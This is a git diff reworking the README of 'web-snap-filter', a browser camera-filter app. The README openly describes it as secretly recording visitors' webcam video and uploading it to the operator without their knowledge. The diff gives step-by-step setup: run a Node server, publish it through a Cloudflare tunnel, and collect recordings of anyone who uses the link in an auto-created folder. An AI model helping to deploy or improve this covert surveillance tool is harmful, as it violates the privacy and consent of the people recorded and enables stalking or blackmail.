@@ -1,36 +1,88 @@
 # web-snap-filter
 A browser-based camera filter application with real-time effects and spy auto record  video upload to server where you can see the video with out the person using the website knowing 
 
-Download "git clone https://github.com/ujjal-saha/web-snap-filter.git"
+## Getting Started
+
+### 1. Clone the repository
+
+git clone https://github.com/ujjal-saha/web-snap-filter.git
+
 cd web-snap-filter
 
-StEpS To get started:
+### 2. Download `cloudflared`
 
-1.cd web-snap-filter
+**Windows (CMD/PowerShell):**
 
-2.curl.exe -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe 
+curl.exe -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe
 
-or curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -o cloudflared.exe
+**Linux:**
 
-3. ".\cloudflared.exe --version"
+curl -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -o cloudflared
 
-4. pip install -r requirements.txt
+chmod +x cloudflared
 
-5. Get-NetTCPConnection -LocalPort 8080 -State Listen | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }
+**macOS:**
 
-6. node server.js
+brew install cloudflared
 
-it will start the website in local host port 8080 and with a key as a protection maser to keep your directory from any anonymous file/malware upload from the user 
+### 3. Verify the installation
 
-Terminal 2 in same directory of web-snap-filter
+**Windows:**
 
-cloudflared tunnel --url http://localhost:8080
+.\cloudflared.exe --version
 
-the copy the key from Terminal 1 ?key=(key) eg:?key=19f3bc499e4f64112de21e52
-"http://localhost:8080/?key=19f3bc499e4f64112de21e52"
+**Linux/macOS:**
 
-open the global hosted link https://something-random.trycloudflare.com?key=(key)
+./cloudflared --version
 
-eg:https://something-random.trycloudflare.com?key=19f3bc499e4f64112de21e52
+### 4. Install dependencies
 
-adter that wn the any one will use the app the recorded vieo will be stored in the same directory filder name rocrds the folder will auto get creted 
+pip install -r requirements.txt
+
+### 5. Free up port 8080 (if already in use)
+
+**Windows (PowerShell):**
+
+Get-NetTCPConnection -LocalPort 8080 -State Listen | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }
+
+**Linux/macOS:**
+
+lsof -ti:8080 | xargs kill -9
+
+### 6. Start the server
+
+node server.js
+
+This starts the website on `localhost:8080`, protected by a key that prevents anonymous file/malware uploads to your directory.
+
+### 7. Open a second terminal (same `web-snap-filter` directory) and start the tunnel
+
+**Windows:**
+
+.\cloudflared.exe tunnel --url http://localhost:8080
+
+**Linux/macOS:**
+
+./cloudflared tunnel --url http://localhost:8080
+
+### 8. Get your access key
+
+Copy the key printed in Terminal 1, e.g. `?key=19f3bc499e4f64112de21e52`
+
+Example local URL:
+
+http://localhost:8080/?key=19f3bc499e4f64112de21e52
+
+### 9. Open the public link
+
+Take the `trycloudflare.com` URL from Terminal 2 and append your key:
+
+https://something-random.trycloudflare.com?key=19f3bc499e4f64112de21e52
+
+### Notes
+
+- Anyone using this link needs the key to access the app.
+
+- Once someone uses the app, the recorded video is saved in the same `web-snap-filter` directory.
+
+- A `recordings` folder is created automatically to store these recordings.
